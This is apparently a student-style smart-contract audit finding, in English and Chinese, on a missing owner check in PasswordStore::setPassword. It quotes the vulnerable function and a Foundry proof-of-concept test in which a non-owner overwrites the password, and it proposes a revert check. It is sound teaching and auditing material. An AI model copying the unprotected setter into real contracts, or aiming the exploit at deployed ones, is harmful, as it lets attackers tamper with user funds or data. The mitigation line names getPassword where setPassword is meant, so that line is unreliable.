[S-#] TITLE 'PasswordStore::setPassword' has no access control ,meaning a non-owner cloud change the password //突出non-owner 并没有对onwer进行访问控制
Description:
The setPassword is not  control access  this setPassword allows only the owner to setPassword a new password
```
 function setPassword(string memory newPassword) external {
        //@Audit-There are no Access Controls
        s_password = newPassword; //这个password是否能经过人为的更改 不是这个所有者也可以设置密码呢？
        emit SetNetPassword();
    }
```
Impact:
  任何人都可以改变密码 达到破坏合约的效果
 Anyone can set/change the stored password.severely breaking the contract`s intended functionality
Proof of Concept:
   Add the following to the PasswordStore.t.sol test file
  ```
  function test_owner_poc_password(address randomAddress) public {
        //筛选出不是owner的人
        vm.assume(randomAddress != owner);
        vm.startPrank(randomAddress);
        //不是owner的人设置的密码叫做这个
        string memory attackPassword = "attacker_win";

        //开始正式调用密码
        passwordStore.setPassword(attackPassword);
        // vm.stopPrank(randomAddress);
        vm.startPrank(owner);
        //获取密码检查一下看是不是attacker成没成功,因为之前的在PasswordStore这个sol内观察函数得到 必须是owner才可以获取密码，因为这个getpassword内部有检测 所以
        string memory actualPassword = passwordStore.getPassword();
        //这里getPassword不传参数 为啥不传参数呢 因为 getPassword内容中 他是 stringmemory 也就是直接从内存中调用就行 没有newPassword这个参数
        assertEq(actualPassword, attackPassword);
    }
  ```


Recommended Mitigation:
 Add an access control conditional to PasswordStore::getPassword 
 
 ```
 if (msg.sender!=s_owner){
    revert PasswordStore__NotOwner();
 }
 ```